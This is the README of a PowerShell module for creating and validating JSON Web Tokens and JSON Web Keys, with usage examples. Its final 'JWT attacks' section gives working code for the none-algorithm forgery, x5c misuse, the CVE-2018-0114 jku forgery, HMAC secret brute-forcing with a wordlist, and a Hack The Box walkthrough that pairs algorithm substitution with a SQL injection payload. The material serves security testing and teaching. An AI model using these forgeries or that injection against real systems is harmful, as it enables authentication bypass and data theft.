# ReadMe

## PSJsonWebToken

This PowerShell module contains functions to create, validate, and test JSON Web Tokens (JWT) per [RFC 7519](https://tools.ietf.org/html/rfc7519). Additional functionality is included for the creation of JSON Web Keys (JWK) per [RFC 7517](https://tools.ietf.org/html/rfc7517).  

### Tested on
:desktop_computer: `Windows 10`  
:penguin: `Linux`  
:apple: `MacOS`  
  

### Installation and Usage

```powershell
# Installing the module:
Install-Module -Name PSJsonWebToken -Scope CurrentUser -Repository PSGallery -AllowClobber
```

## Examples

### Token creation and validation

```powershell
# Decode (not validate) a JWT
$jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MDYwNTkyMzEsIm5iZiI6MTYwNjA1OTIzMSwiZXhwIjoxNjA2MDU5NTMxLCJzdWIiOiJ1c2VybmFtZUBjb21wYW55LmNvbSJ9.7j3SPowPaHlviVZeRFxIwyLa1qPzrL5jk1sguNG0yDg"
$jwt | ConvertFrom-EncodedJsonWebToken


# Create an HMAC-SHA256 signed JWT with a five minute lifetime
$secretKey = "secret" | ConvertTo-SecureString -AsPlainText -Force
$jwt = New-JsonWebToken -Claims @{sub="username@company.com"} -HashAlgorithm SHA256 -SecureKey $secretKey -TimeToLive 300


# Validate an HMAC-SHA256 signed JWT
$jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MDYwNTkyMzEsIm5iZiI6MTYwNjA1OTIzMSwiZXhwIjoxNjA2MDU5NTMxLCJzdWIiOiJ1c2VybmFtZUBjb21wYW55LmNvbSJ9.7j3SPowPaHlviVZeRFxIwyLa1qPzrL5jk1sguNG0yDg"
$secretKey = "secret" | ConvertTo-SecureString -AsPlainText -Force
Test-JsonWebToken -JsonWebToken $jwt -HashAlgorithm SHA256 -SecureKey $secretKey


# Validate an HMAC-SHA256 signed JWT signature only (skip expiration check)
$jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MDYwNTkyMzEsIm5iZiI6MTYwNjA1OTIzMSwiZXhwIjoxNjA2MDU5NTMxLCJzdWIiOiJ1c2VybmFtZUBjb21wYW55LmNvbSJ9.7j3SPowPaHlviVZeRFxIwyLa1qPzrL5jk1sguNG0yDg"
$secretKey = "secret" | ConvertTo-SecureString -AsPlainText -Force
Test-JsonWebToken -JsonWebToken $jwt -HashAlgorithm SHA256 -SecureKey $secretKey -SkipExpirationCheck


# Create an RSA-SHA256 signed JWT with a five minute lifetime
$cert = Get-PfxCertificate -FilePath "~/certs/cert.pfx"
$jwt = New-JsonWebToken -Claims @{sub="username@company.com"} -HashAlgorithm SHA256 -Certificate $cert -TimeToLive 300


# Validate an RSA-SHA256 signed JWT (signature and expiration check)
$cert = Get-PfxCertificate -FilePath "~/certs/cert.cer" # (Get-PfxCertificate is capable of also getting certs sans private key)
$jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJ5Q3Zabms3azhXNjZ3UjJMWFI5V0Nzd2hBYyIsImtpZCI6IjJ5Q3Zabms3azhXNjZ3UjJMWFI5V0Nzd2hBYyJ9.eyJpYXQiOjE2MDYwNTk2MjMsIm5iZiI6MTYwNjA1OTYyMywiZXhwIjoxNjA2MDU5OTIzLCJzdWIiOiJ1c2VybmFtZUBjb21wYW55LmNvbSJ9.R6nTqCRwj_FchHp4oblZTkEIhSiSpGCV255SdXmWibNKS4eXtPlCngYaqfIqCwbeCbQB9G2zKHm2gAAolmylaZVoxaGTLOrrJXhfX79b4MNCT2Ixa1h2-B0RbBwV0lBCuaZscays-mxbR0INdnCPnuefrh1VyU9MC6dBpi-Q8r_En6Rtk1wl_a-xX93WtC2no96AtEV5kNErRUHOmTfhe2IjZR6S5uaMgXxrp7Ays8kEYVGwdWhF-JJ_9yUw9PB5pCmgkBED6urNNoeSTeEjTiqsRoHa1Ra9DhOriaegWXOZHEdthpg_JIzDBPYWjBbIfhNvhCwBrhGHbeXUtJL4bg"
Test-JsonWebToken -JsonWebToken $jwt -HashAlgorithm SHA256 -Certificate $cert


# Verify a JSON Web Token's digital signature only (no expiration) against a JSON Web Key
$jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJ5Q3Zabms3azhXNjZ3UjJMWFI5V0Nzd2hBYyIsImtpZCI6IjJ5Q3Zabms3azhXNjZ3UjJMWFI5V0Nzd2hBYyJ9.eyJpYXQiOjE2MTgyNTAzODksIm5iZiI6MTYxODI1MDM4OSwiZXhwIjoxNjE4MjU1MTg5LCJzdWIiOiJ0b255In0.X-RZm-3Hto5U-8Q-Wp1ggqWTFPkO5-Cz9lzoKsH5-1RR9GOrGPuWn-bjIv1YJ46h5Bw-KpiX-dOS47TAq2A0BWdAwczLVA6pzha1WswkT_u3cO1_KSoOjD9qFLjCgk-ns7A48iXpNcOoPBFXgfx8G0rRK68sSnokJ7N2NH-YNUOjg3U7DNJ_-iz8WZ5dNlOvpDsTy0BHMX-lho18sUmakUNpadJr-oD7BXIp--Z57UERBFibppaoxseYRo3VfmhgHibTxP-39mcxU6sH9a99fEEt80hj4w6rZobRxZV-pFPS22B8TBAfVf8L9faMLaXmgV7xtQohqQZgL6oKdJzFPQ"
$jwk = '
{
  "kty": "RSA",
  "use": "sig",
  "e": "AQAB",
  "n": "0yvTvlqT5yrk6lDzmK5_i6e-NKW4Bw8J9U62rcWI4IAr-vKaNqitmSwVLr2jJu29xQ__W22iGu584A82AS5N5YrwA6Rek-7WuHinwupFtCN-cCTzJlAcXUxyU7H0LfFxsXS1LUxSl7F_liIKH81QFE5RvI97R9bmbCn_BXpK4pHnTBGJigA8gJQ0U__YFk7AOSFUBeursQfCVPID99FpQ6pyj-h9WgdOneAfWde4SM1Pnovw59T2UT-JO-ObA5WOtvl0xW21djhhBRusVGWJuncNElhhRpUqNSOcsNQVe026zw8dX1wiMs9migQmz_LokH1bHENIuybdK9xBhXRRbw",
  "kid": "2yCvZnk7k8W66wR2LXR9WCswhAc"
}
'
Test-JsonWebToken -JsonWebToken $jwt -HashAlgorithm SHA256 -JsonWebKey $jwk -SkipExpirationCheck


# Attempts to validate a JSON Web Token signature against a collection of JSON Web Keys in https://app.mycompany.com/common/discovery/keys 
# and provides verbose output detailing what JWK was used to verify the signature
$jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJ5Q3Zabms3azhXNjZ3UjJMWFI5V0Nzd2hBYyIsImtpZCI6IjJ5Q3Zabms3azhXNjZ3UjJMWFI5V0Nzd2hBYyJ9.eyJpYXQiOjE2MTgyNTAzODksIm5iZiI6MTYxODI1MDM4OSwiZXhwIjoxNjE4MjU1MTg5LCJzdWIiOiJ0b255In0.X-RZm-3Hto5U-8Q-Wp1ggqWTFPkO5-Cz9lzoKsH5-1RR9GOrGPuWn-bjIv1YJ46h5Bw-KpiX-dOS47TAq2A0BWdAwczLVA6pzha1WswkT_u3cO1_KSoOjD9qFLjCgk-ns7A48iXpNcOoPBFXgfx8G0rRK68sSnokJ7N2NH-YNUOjg3U7DNJ_-iz8WZ5dNlOvpDsTy0BHMX-lho18sUmakUNpadJr-oD7BXIp--Z57UERBFibppaoxseYRo3VfmhgHibTxP-39mcxU6sH9a99fEEt80hj4w6rZobRxZV-pFPS22B8TBAfVf8L9faMLaXmgV7xtQohqQZgL6oKdJzFPQ"
$jwkUri = "https://app.mycompany.com/common/discovery/keys"
Test-JsonWebToken -JsonWebToken $jwt -Uri $jwkUri -SkipExpirationCheck -Verbose
```

### Generate a JWK (JSON Web Key) set from a certificate
```powershell
# Return as formatted JSON
$cert = Get-PfxCertificate -FilePath "~/certs/cert.cer" 
New-JsonWebKeySet -Certificate $cert -KeyOperations Verification


# Compress the resulting JSON
$cert = Get-PfxCertificate -FilePath "~/certs/cert.cer" 
New-JsonWebKeySet -Certificate $cert -KeyOperations Verification -Compress
```

### JWT attacks
```powershell
# None alg attack
$jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJ5Q3Zabms3azhXNjZ3UjJMWFI5V0Nzd2hBYyIsImtpZCI6IjJ5Q3Zabms3azhXNjZ3UjJMWFI5V0Nzd2hBYyJ9.eyJpYXQiOjE2MDYwNTk2MjMsIm5iZiI6MTYwNjA1OTYyMywiZXhwIjoxNjA2MDU5OTIzLCJzdWIiOiJ1c2VybmFtZUBjb21wYW55LmNvbSJ9.R6nTqCRwj_FchHp4oblZTkEIhSiSpGCV255SdXmWibNKS4eXtPlCngYaqfIqCwbeCbQB9G2zKHm2gAAolmylaZVoxaGTLOrrJXhfX79b4MNCT2Ixa1h2-B0RbBwV0lBCuaZscays-mxbR0INdnCPnuefrh1VyU9MC6dBpi-Q8r_En6Rtk1wl_a-xX93WtC2no96AtEV5kNErRUHOmTfhe2IjZR6S5uaMgXxrp7Ays8kEYVGwdWhF-JJ_9yUw9PB5pCmgkBED6urNNoeSTeEjTiqsRoHa1Ra9DhOriaegWXOZHEdthpg_JIzDBPYWjBbIfhNvhCwBrhGHbeXUtJL4bg"
[System.Collections.Hashtable]$headerHashTable = Get-JsonWebTokenHeader -JsonWebToken $jwt

$headerHashTable.Remove("kid")
$headerHashTable.Remove("x5t")
$headerHashTable.alg = "none"

$newHeader = $headerHashTable | ConvertTo-JwtPart
$unalteredPayload = Get-JsonWebTokenPayload -JsonWebToken $jwt -AsEncodedString

$alteredJwt = "{0}.{1}." -f $newHeader, $unalteredPayload


# x5c claim misuse
$cert = Get-PfxCertificate -FilePath "~/certs/cert.pfx"
$x5c = Convert-X509CertificateToBase64 -Certificate $cert -NoFormat
$encodedThumbprint = ConvertTo-Base64UrlEncodedString -Bytes $cert.GetCertHash()
$jwtHeader = @{typ="JWT";alg="RS256";kid=$encodedThumbprint;x5c=$x5c} | ConvertTo-JwtPart
$jwtPayload = @{sub="username@company.com";role="admin"} | ConvertTo-JwtPart
$jwtSansSig = "{0}.{1}" -f $jwtHeader, $jwtPayload
$signature = New-JwtSignature -JsonWebToken $jwtSansSig -HashAlgorithm SHA256 -Certificate $cert

$signedJwt = "{0}.{1}" -f $jwtSansSig, $signature


# CVE-2018-0114 vulnerability
# 1. Acquire JWT:
$jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJ5Q3Zabms3azhXNjZ3UjJMWFI5V0Nzd2hBYyIsImtpZCI6IjJ5Q3Zabms3azhXNjZ3UjJMWFI5V0Nzd2hBYyJ9.eyJpYXQiOjE2MDYwNTk2MjMsIm5iZiI6MTYwNjA1OTYyMywiZXhwIjoxNjA2MDU5OTIzLCJzdWIiOiJ1c2VybmFtZUBjb21wYW55LmNvbSJ9.R6nTqCRwj_FchHp4oblZTkEIhSiSpGCV255SdXmWibNKS4eXtPlCngYaqfIqCwbeCbQB9G2zKHm2gAAolmylaZVoxaGTLOrrJXhfX79b4MNCT2Ixa1h2-B0RbBwV0lBCuaZscays-mxbR0INdnCPnuefrh1VyU9MC6dBpi-Q8r_En6Rtk1wl_a-xX93WtC2no96AtEV5kNErRUHOmTfhe2IjZR6S5uaMgXxrp7Ays8kEYVGwdWhF-JJ_9yUw9PB5pCmgkBED6urNNoeSTeEjTiqsRoHa1Ra9DhOriaegWXOZHEdthpg_JIzDBPYWjBbIfhNvhCwBrhGHbeXUtJL4bg"

# 2. Get cert used to sign token via RSA-SHA256:
$cert = Get-PfxCertificate -FilePath "~/certs/cert.pfx"

# 3. Deserialize existing payload:
[System.Collections.Hashtable]$payload = Get-JsonWebTokenPayload -JsonWebToken $jwt

# 4. Generate JWK set to be placed on http://myserver/jwkcollection/jwks.json:
$cert | New-JsonWebKeySet -Compress | Out-File -FilePath "~/certs/jwks.json" -Encoding ascii

# 5. Create token with jku claim in header signed by certificate with private key defined in step 2:
$jwkUri = "http://myserver/jwkcollection/jwks.json"
$newJwt = New-JsonWebToken -Claims $payload -HashAlgorithm SHA256 -SigningCertificate $cert -JwkUri $jwkUri -TimeToLive 300


# Brute force an HMAC-SHA256 JWT
$jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MDYxNDEwOTMsIm5iZiI6MTYwNjE0MTA5MywiZXhwIjoxNjA2MTQxMzkzLCJqdGkiOiI1Njk5YTBlYTk3YzM0Yzc2OTlkZGZlNzNmNTIzOTI1MiIsInN1YiI6InVzZXJuYW1lQGNvbXBhbnkuY29tIn0.Ej86QALzH37R1zB7QhwwYdFjXL1UhG2E3n6nezEYONY"

$wordListFilePath = "./rockyou.txt"
$wordList = [System.IO.File]::ReadAllLines($wordListFilePath)

foreach ($secret in $wordList)
{
    if ($secret.Trim().Length -ge 1)
    {
        [bool]$cracked = Test-JwtSignature -JsonWebToken $jwt -Key $secret.Trim() -HashAlgorithm SHA256
        if ($cracked)
        {
            $outputMessage = "Secret was: {0}" -f $secret
            Write-Host -Object $outputMessage -ForegroundColor Green
            break
        }
    }
}


# Hack The Box "Under Construction" walkthrough (algorithm substitution and SQL injection)
# 1. JWT after registration and authentication:
$jwt = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRvbnkiLCJwayI6Ii0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTk1b1RtOUROemNIcjhnTGhqWmFZXG5rdHNiajFLeHhVT296dzB0clA5M0JnSXBYdjZXaXBRUkI1bHFvZlBsVTZGQjk5SmM1UVowNDU5dDczZ2dWRFFpXG5YdUNNSTJob1VmSjFWbWpOZVdDclNyRFVob2tJRlpFdUN1bWVod3d0VU51RXYwZXpDNTRaVGRFQzVZU1RBT3pnXG5qSVdhbHNIai9nYTVaRUR4M0V4dDBNaDVBRXdiQUQ3MytxWFMvdUN2aGZhamdwekhHZDlPZ05RVTYwTE1mMm1IXG4rRnluTnNqTk53bzVuUmU3dFIxMldiMllPQ3h3MnZkYW1PMW4xa2YvU015cFNLS3ZPZ2o1eTBMR2lVM2plWE14XG5WOFdTK1lpWUNVNU9CQW1UY3oydzJrekJoWkZsSDZSSzRtcXVleEpIcmEyM0lHdjVVSjVHVlBFWHBkQ3FLM1RyXG4wd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4iLCJpYXQiOjE2MDgyMzkzMTd9.siXge7yRMiG7jE-lUef_mRCQ0ZY3YGPd-0psdjXoHU3CYSl3YkhpWiw724Ns9J_HVkGzsJBd0ZPRKpPdGL0MIaz2iS9IAqNnfdeM36cZpS5MHQT-zI3K2xfZQD2vjU4uyVmxSrSr1YOxFez1Mt6j-lkEiApX4uDwenysYvtNZ5rSiKipyhh03-tSZQJp3zR8YK6ileGy9KTRfGrjRz7_7CfGikGufJuGDaSBNCGKcMvPRJcotM6hWT5hXBW7JTXN62GZqabrXeSkz1DgMxntR5-iOmntLsdJyLhSKNi9jLx-fI3ticBc--70trVYSbV7kowBNtpHWrdvtefh5pgO1A"

# 2. Payload as a hashtable:
$payload = $jwt | Get-JsonWebTokenPayload 

# 3. Decoded JWT and this is where we see the "pk" claim with the public key:
$jwt | DecodeJwt | Format-List

# 4. Get the public key:
$key = $payload.pk

# 5. Copy of the payload we're going to alter:
$newPayload = $payload

# 6. SQL injection which is the user name value followed by the query:
$query = "tony' AND 1=0 UNION SELECT 1,(SELECT top_secret_flaag FROM flag_storage),3;--"

# 7. Change the user name from "tony" to the above SQL query:
$newPayload.username = $query

# 8. Repackage JWT payload:
$newEncodedPayload = $newPayload | ConvertTo-JwtPart

# 9. Create a new header which has an alg of HS256 as opposed to the prior value of RS256:
$newHeader = @{typ="JWT";alg="HS256"} | ConvertTo-JwtPart

# 10. Concatentate the header and payload:
$jwtSansSig = "$newHeader.$newEncodedPayload"

# 11. Sign the above header and paylod:
$sig = New-JwtSignature -JsonWebToken $jwtSansSig -HashAlgorithm SHA256 -Key $key

# 12. Join the header, payload and signature:
$newJwt = "$jwtSansSig.$sig"
```
